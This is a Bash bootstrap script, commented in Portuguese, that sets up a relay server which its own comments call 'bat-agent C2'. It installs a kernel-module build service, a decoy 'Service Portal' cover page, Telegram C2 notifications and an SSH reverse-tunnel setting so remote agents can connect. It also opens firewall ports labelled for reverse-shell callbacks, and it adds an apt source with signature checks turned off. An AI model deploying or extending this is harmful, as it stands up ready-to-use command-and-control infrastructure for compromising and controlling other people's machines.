#!/bin/bash
# setup.sh — Bootstrap idempotente do relay bat/KCC
#
# Uso:
#   ./setup.sh [--secret HMAC_SECRET] [--src-dir /caminho/kperf-qos-src]
#
# Requisitos:
#   - Ubuntu 22.04 ou Debian 12 (amd64 ou arm64)
#   - Acesso root
#   - IP público já configurado na interface de rede
#
# Idempotente: rodar múltiplas vezes não quebra nada.
# Não depende de AWS, Terraform, nem de nenhum provider específico.
# Funciona em: EC2, DigitalOcean, Hetzner, Vultr, bare metal, VPS qualquer.

set -euo pipefail

RELAY_SECRET="${BAT_SECRET:-}"        # HMAC secret — pode vir de env ou --secret
SRC_OVERRIDE=""                        # path local opcional para kperf-qos-src inicial

# Parse args
while [[ $# -gt 0 ]]; do
    case "$1" in
        --secret)   RELAY_SECRET="$2";  shift 2 ;;
        --src-dir)  SRC_OVERRIDE="$2";  shift 2 ;;
        *) echo "Arg desconhecido: $1"; exit 1 ;;
    esac
done

log()  { echo "[SETUP] $*"; }
ok()   { echo "[OK]    $*"; }
skip() { echo "[SKIP]  $* (já existe)"; }

# ── 1. Dependências ────────────────────────────────────────────────────────────
log "Instalando dependências..."
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y \
    python3 python3-pip \
    gcc gcc-12 make \
    linux-headers-$(uname -r) \
    nginx \
    ufw \
    fail2ban \
    rsync \
    openssl \
    curl wget \
    2>&1 | tail -5
ok "Dependências instaladas"

# ── 2. Estrutura de diretórios /root/kcc/ ────────────────────────────────────
log "Criando estrutura /root/kcc/..."
mkdir -p /root/kcc/cache
mkdir -p /root/kcc/kperf-qos-src
chmod 700 /root/kcc
chmod 700 /root/kcc/cache
ok "/root/kcc/ pronto"

# ── 3. Instalar kcc-server.py e kcc-build.sh ─────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

log "Instalando kcc-server.py..."
cp "${SCRIPT_DIR}/kcc-server.py" /root/kcc/kcc-server.py
chmod 700 /root/kcc/kcc-server.py
ok "kcc-server.py → /root/kcc/"

log "Instalando kcc-build.sh..."
cp "${SCRIPT_DIR}/kcc-build.sh" /root/kcc/kcc-build.sh
chmod 700 /root/kcc/kcc-build.sh
ok "kcc-build.sh → /root/kcc/"

# Se --src-dir fornecido, sincroniza source do kperf-qos
if [[ -n "$SRC_OVERRIDE" && -d "$SRC_OVERRIDE" ]]; then
    log "Sincronizando kperf-qos-src de ${SRC_OVERRIDE}..."
    rsync -a --delete "${SRC_OVERRIDE}/" /root/kcc/kperf-qos-src/
    ok "kperf-qos-src sincronizado"
fi

# ── 4. Gravar secret se fornecido ────────────────────────────────────────────
if [[ -n "$RELAY_SECRET" ]]; then
    log "Gravando secret em /root/kcc/.env..."
    cat > /root/kcc/.env <<EOF
KCC_SECRET=${RELAY_SECRET}
EOF
    chmod 600 /root/kcc/.env
    ok "Secret gravado"
else
    log "AVISO: --secret não fornecido. kcc-server.py usará env KCC_SECRET ou default."
fi

# ── 5. Instalar kcc.service ───────────────────────────────────────────────────
log "Instalando kcc.service..."
cp "${SCRIPT_DIR}/kcc.service" /etc/systemd/system/kcc.service

# Aumenta StartLimitBurst/Interval para evitar que 5 crashes rápidos matem o serviço
mkdir -p /etc/systemd/system/kcc.service.d
cat > /etc/systemd/system/kcc.service.d/limits.conf <<'EOF'
[Unit]
StartLimitIntervalSec=60
StartLimitBurst=10
EOF

systemctl daemon-reload
systemctl enable kcc
systemctl restart kcc
ok "kcc.service ativo ($(systemctl is-active kcc))"

# ── 6. TLS self-signed para nginx (/etc/ssl/lab/) ────────────────────────────
if [[ ! -f /etc/ssl/lab/cert.pem ]]; then
    log "Gerando certificado TLS self-signed..."
    mkdir -p /etc/ssl/lab
    openssl req -x509 -newkey rsa:4096 -sha256 -days 365 -nodes \
        -keyout /etc/ssl/lab/key.pem \
        -out    /etc/ssl/lab/cert.pem \
        -subj   "/C=BR/ST=SP/O=Lab/CN=lab.local" \
        -addext "subjectAltName=IP:$(curl -s4 ifconfig.me)" \
        2>/dev/null
    chmod 600 /etc/ssl/lab/key.pem
    chmod 644 /etc/ssl/lab/cert.pem
    ok "TLS cert gerado → /etc/ssl/lab/"
else
    skip "TLS cert já existe"
fi

# ── 7. Cover page /var/www/nexus ─────────────────────────────────────────────
if [[ ! -f /var/www/nexus/index.html ]]; then
    log "Criando cover page..."
    mkdir -p /var/www/nexus
    # Cover page mínima — substituir por conteúdo real se necessário
    cat > /var/www/nexus/index.html <<'HTML'
<!DOCTYPE html><html><head><title>Service Portal</title></head>
<body><p>Service Portal</p></body></html>
HTML
    chown -R www-data:www-data /var/www/nexus
    ok "Cover page criada"
else
    skip "Cover page já existe"
fi

# ── 8. Configurar nginx ───────────────────────────────────────────────────────
log "Configurando nginx..."
cp "${SCRIPT_DIR}/nginx/bat.conf" /etc/nginx/nginx.conf
nginx -t 2>&1 | tail -3
systemctl enable nginx

# nginx por padrão tem Restart=no — override para alta disponibilidade
mkdir -p /etc/systemd/system/nginx.service.d
cat > /etc/systemd/system/nginx.service.d/restart.conf <<'EOF'
[Service]
Restart=always
RestartSec=5
EOF

systemctl daemon-reload
systemctl restart nginx
ok "nginx ativo ($(systemctl is-active nginx)) — Restart=always"

# ── 9. batnotify (Telegram C2 notifications) ─────────────────────────────────
if [[ -f "${SCRIPT_DIR}/batnotify" ]]; then
    log "Instalando batnotify..."
    mkdir -p /root/bin
    cp "${SCRIPT_DIR}/batnotify" /root/bin/batnotify
    chmod 700 /root/bin/batnotify
    ok "batnotify → /root/bin/batnotify"
    log "Configure TG_TOKEN e TG_CHAT_ID em ~/.env para ativar notificações Telegram"
else
    log "AVISO: batnotify não encontrado em ${SCRIPT_DIR} — Telegram desativado"
fi

# ── 10. SSH — GatewayPorts yes ───────────────────────────────────────────────
# Obrigatório para batrev: -R 0.0.0.0:9443:localhost:9443 bind em todas interfaces,
# caso contrário o reverse tunnel só escuta em 127.0.0.1 e agentes remotos não alcançam.
if ! grep -q "^GatewayPorts yes" /etc/ssh/sshd_config; then
    log "Configurando GatewayPorts yes..."
    echo "GatewayPorts yes" >> /etc/ssh/sshd_config
    systemctl reload sshd
    ok "GatewayPorts yes aplicado"
else
    skip "GatewayPorts yes já configurado"
fi

# ── 11. SSH hardening ────────────────────────────────────────────────────────
# MaxAuthTries=3 reduz janela de brute-force; fail2ban bloqueia IPs persistentes.
if ! grep -q "^MaxAuthTries 3" /etc/ssh/sshd_config; then
    log "Configurando MaxAuthTries 3..."
    # Remove valores existentes e adiciona
    sed -i '/^#\?MaxAuthTries/d' /etc/ssh/sshd_config
    echo "MaxAuthTries 3" >> /etc/ssh/sshd_config
    ok "MaxAuthTries 3 aplicado"
else
    skip "MaxAuthTries 3 já configurado"
fi

# fail2ban — bloqueia IPs após 3 falhas SSH em 10 min (ban 1h)
if ! systemctl is-active fail2ban &>/dev/null; then
    log "Configurando fail2ban..."
    cat > /etc/fail2ban/jail.d/sshd-relay.conf <<'EOF'
[sshd]
enabled  = true
port     = ssh
maxretry = 3
findtime = 600
bantime  = 3600
EOF
    systemctl enable fail2ban
    systemctl restart fail2ban
    ok "fail2ban ativo (sshd: maxretry=3 findtime=600s bantime=3600s)"
else
    skip "fail2ban já ativo"
fi

# ── 12. Apt source Debian bookworm (para compilação de headers Debian) ────────
# kcc-build.sh._install_debian_headers usa apt-cache show para obter versão do pacote.
# Sem este source o build de kernels Debian falha com "cannot determine package version".
# Pin priority=1 previne que pacotes Debian substituam os Ubuntu.
if [[ ! -f /etc/apt/sources.list.d/debian-bookworm.list ]]; then
    log "Adicionando Debian bookworm apt source (para headers Debian)..."
    cat > /etc/apt/sources.list.d/debian-bookworm.list <<'EOF'
deb [arch=amd64 trusted=yes] http://deb.debian.org/debian bookworm main
deb [arch=amd64 trusted=yes] http://security.debian.org/debian-security bookworm-security main
EOF
    cat > /etc/apt/preferences.d/debian-bookworm-pin <<'EOF'
Package: *
Pin: origin deb.debian.org
Pin-Priority: 1

Package: *
Pin: origin security.debian.org
Pin-Priority: 1
EOF
    apt-get update -qq 2>/dev/null || true
    ok "Debian bookworm source adicionado (pin priority=1)"
else
    skip "Debian bookworm source já existe"
fi

# ── 13. UFW ───────────────────────────────────────────────────────────────────
log "Configurando UFW..."
ufw --force reset
ufw default deny incoming
ufw default allow outgoing
ufw allow 22/tcp    comment "SSH management"
ufw allow 443/tcp   comment "bat-agent C2 + cover page"
ufw allow 9443/tcp  comment "bat-agent rawsock callback / reverse shell"
ufw allow 9444/tcp  comment "KCC HTTPS — agent direct (K-series)"
ufw allow 4445/tcp  comment "reverse shell callback"
ufw --force enable
ok "UFW ativo: 22, 443, 9443, 9444, 4445"

# ── 14. Status final ──────────────────────────────────────────────────────────
echo ""
echo "═══════════════════════════════════════════════"
echo " Relay setup COMPLETO"
echo "═══════════════════════════════════════════════"
echo " kcc.service:  $(systemctl is-active kcc)"
echo " nginx:        $(systemctl is-active nginx)"
echo " fail2ban:     $(systemctl is-active fail2ban)"
echo " UFW:          $(ufw status | head -1)"
echo " KCC dir:      /root/kcc/"
echo " TLS cert:     /etc/ssl/lab/cert.pem"
echo ""
echo " Próximos passos:"
echo "   1. sync.sh user@relay --restart-kcc   (sincronizar kperf-qos-src)"
echo "   2. batrev                              (reverse tunnel local → relay)"
echo "   3. batserver                           (bat-server local via tunnel)"
echo "═══════════════════════════════════════════════"
